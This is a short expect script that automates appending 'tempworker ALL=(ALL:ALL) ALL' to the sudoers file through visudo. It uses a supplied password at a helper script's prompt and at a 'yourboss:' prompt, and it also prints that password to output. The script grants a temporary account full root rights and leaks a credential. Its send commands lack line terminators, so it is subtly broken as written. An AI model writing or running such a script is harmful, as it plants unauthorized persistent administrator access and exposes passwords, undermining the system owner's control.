#!/usr/bin/expect
set password [lindex $argv 0]
spawn ./elevate_tempworker_helper.sh
expect "assword:"
send $password
puts $password
send "echo \"tempworker ALL=(ALL:ALL) ALL\" | sudo EDITOR=\"tee -a\" visudo"
expect "yourboss:"
send $password
